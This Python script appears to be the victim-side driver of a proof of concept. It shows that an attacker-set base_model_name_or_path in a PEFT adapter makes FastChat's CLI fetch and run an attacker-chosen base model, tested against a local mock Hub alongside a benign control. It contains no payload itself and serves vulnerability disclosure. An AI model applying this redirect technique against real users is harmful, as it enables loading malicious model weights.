"""Victim-side driver: run FastChat's real console CLI over a PEFT adapter package.

usage:  python run_repro.py adapter_attack_peft
        python run_repro.py adapter_benign_peft

What happens, in order
----------------------
1. read ``base_model_name_or_path`` out of the adapter package (this string is the
   only attacker-controlled value, and the only difference between the two
   adapter directories built by ``make_poc.py``);
2. start ``mock_hub.py`` on 127.0.0.1:8765 as a stand-in for huggingface.co and
   point the child process at it with ``HF_ENDPOINT`` (the real ``huggingface_hub``
   download path is used, nothing is monkey-patched);
3. run the REAL product entry point -- ``python -m fastchat.serve.cli`` from the
   pinned checkout at commit 587d5cf, unmodified -- with one line ("Hello") on
   stdin so the CLI loads the adapter, loads whatever base model the adapter
   names, and answers that single turn with greedy decoding;
4. report which repositories the product contacted (mock-hub request log) and
   which repository id the product's own reply spells out (the answer oracle
   built into the two second-hop repositories).
"""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(HERE, "work")
HUB = os.path.join(WORK, "hub")
REQLOG = os.path.join(WORK, "hub_requests.log")
PINNED = os.path.join(HERE, "FastChat-587d5cf")

CONTROL_REPO = "mbe2e-control/fastchat-base"
ATTACK_REPO = "mbe2e-attacker/fastchat-base"
USER_MESSAGE = "Hello"
# both second-hop repositories answer with their own repository id (built by
# make_poc.py), so the product's reply names the repository it loaded
CASES = {
    "adapter_benign_peft": (CONTROL_REPO, CONTROL_REPO),
    "adapter_attack_peft": (ATTACK_REPO, ATTACK_REPO),
}


def repos_and_files(log_path: str):
    """Parse the mock-hub request log into (repos contacted, files fetched)."""
    repos, files = set(), []
    if not os.path.exists(log_path):
        return repos, files
    with open(log_path, encoding="utf-8") as f:
        for line in f:
            parts = line.split()
            if len(parts) < 2:
                continue
            path = parts[1]
            seg = path.split("/resolve/")[0].strip("/")
            if seg.count("/") >= 1 and not seg.startswith("api"):
                repos.add(seg)
            if "/resolve/" in path:
                files.append(path.split("/resolve/")[-1])
    return repos, files


def main() -> int:
    case = sys.argv[1] if len(sys.argv) > 1 else "adapter_attack_peft"
    if case not in CASES:
        raise SystemExit("usage: python run_repro.py adapter_attack_peft|adapter_benign_peft")
    expected_repo, expected_answer = CASES[case]

    adapter_dir = os.path.join(WORK, case)
    adapter_arg = os.path.join("work", case)  # relative, the way a user types it
    cfg_path = os.path.join(adapter_dir, "adapter_config.json")
    if not os.path.isfile(cfg_path):
        raise SystemExit("missing %s -- run `python make_poc.py` first" % cfg_path)

    with open(cfg_path, encoding="utf-8") as f:
        pointer = json.load(f)["base_model_name_or_path"]
    print("[driver] adapter package : %s" % adapter_arg)
    print("[driver] base pointer    : %s" % pointer)
    print("[driver] prompt on stdin  : %s" % USER_MESSAGE)

    # clean slate so the evidence belongs to this run only: request log and the
    # per-case Hub cache (otherwise a cached blob would hide the second-hop fetch)
    if os.path.exists(REQLOG):
        os.remove(REQLOG)
    hf_home = os.path.join(WORK, "hf-home-" + case)
    shutil.rmtree(hf_home, ignore_errors=True)

    import mock_hub

    mock_hub.start_server(port=8765, hub_root=HUB, request_log=REQLOG)
    print("[driver] mock Hub        : work/hub on 127.0.0.1:8765 (stands in for huggingface.co)")

    env = os.environ.copy()
    env["HF_HOME"] = hf_home
    env["HF_ENDPOINT"] = "http://127.0.0.1:8765"
    env["HF_HUB_DISABLE_TELEMETRY"] = "1"
    env["HF_HUB_DISABLE_SYMLINKS_WARNING"] = "1"
    env["HF_HUB_DISABLE_PROGRESS_BARS"] = "1"
    env["PYTHONPATH"] = PINNED
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONIOENCODING"] = "utf-8"
    env["PYTHONWARNINGS"] = "ignore"  # library deprecation warnings only
    env["TRANSFORMERS_VERBOSITY"] = "error"  # keep the reply line free of warnings
    for var in ("HF_HUB_OFFLINE", "TRANSFORMERS_OFFLINE", "HF_TOKEN"):
        env.pop(var, None)

    cmd = [
        sys.executable, "-m", "fastchat.serve.cli",
        "--model-path", adapter_arg,
        "--device", "cpu",
        "--temperature", "0",
        "--max-new-tokens", "4",
        "--style", "simple",
    ]
    print("[driver] running: python -m fastchat.serve.cli --model-path %s "
          "--device cpu --temperature 0 --max-new-tokens 4 --style simple" % adapter_arg)
    print("-" * 72)

    log_path = os.path.join(WORK, "run_%s.log" % case)
    with open(log_path, "wb") as logf:
        proc = subprocess.Popen(cmd, env=env, cwd=HERE, stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        proc.stdin.write((USER_MESSAGE + "\n").encode())
        proc.stdin.flush()
        proc.stdin.close()
        for raw in proc.stdout:
            sys.stdout.buffer.write(raw)
            sys.stdout.buffer.flush()
            logf.write(raw)
        proc.wait()
    print("-" * 72)
    print("[driver] product CLI exit code: %d" % proc.returncode)
    print("[driver] product output saved to work/run_%s.log" % case)

    log_copy = os.path.join(WORK, "hub_requests_%s.log" % case)
    shutil.copyfile(REQLOG, log_copy)
    repos, files = repos_and_files(REQLOG)
    print("[driver] repos contacted: %s"
          % (", ".join(sorted(repos)) if repos else "<none>"))
    print("[driver] files fetched  : %s"
          % (", ".join(dict.fromkeys(files)) if files else "<none>"))
    print("[driver] request log kept at work/hub_requests_%s.log" % case)

    with open(log_path, encoding="utf-8", errors="replace") as f:
        cli_output = f.read()
    reply = ""
    for line in cli_output.splitlines():
        if "Assistant:" not in line:
            continue
        tail = line.rsplit("Assistant:", 1)[1].strip()
        if tail:
            reply = tail
    print("[driver] CLI reply        : %s" % (reply or "<empty>"))

    answer_ok = expected_answer in cli_output
    repo_ok = repos == {expected_repo}
    print("[driver] reply names %s: %s" % (expected_repo, answer_ok))
    print("=" * 72)
    if expected_repo == ATTACK_REPO:
        if proc.returncode == 0 and answer_ok and repo_ok:
            print("RESULT: BASE-MODEL REDIRECT CONFIRMED")
            print("        the adapter's base_model_name_or_path selected the base")
            print("        model: the CLI downloaded %s" % ATTACK_REPO)
            print("        and answered out of those weights; %s" % CONTROL_REPO)
            print("        was never contacted.")
            return 0
    else:
        if proc.returncode == 0 and answer_ok and repo_ok:
            print("RESULT: no redirect (negative control)")
            print("        the benign adapter fetched %s" % CONTROL_REPO)
            print("        only; %s was never contacted." % ATTACK_REPO)
            return 0
    print("RESULT: unexpected outcome (exit=%d, repos=%s, reply=%r)"
          % (proc.returncode, sorted(repos), reply))
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
